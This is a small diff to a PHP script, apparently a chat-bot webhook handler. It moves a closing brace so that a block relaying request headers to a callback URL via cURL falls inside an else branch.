@@ -421,7 +421,6 @@ else {
                     curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
                     $result = curl_exec( $ch );
                     curl_close( $ch );
-}
 } else {
 $url = "https://abdul.in.th/callback/f2907686d8a234b7298c70c144985c7a.php";
 $headers = getallheaders();
@@ -444,6 +443,7 @@ curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $result = curl_exec($ch);
 curl_close($ch);
 exit;
+}
 }
 if (isset($mreply)) {
     $result = json_encode($mreply);
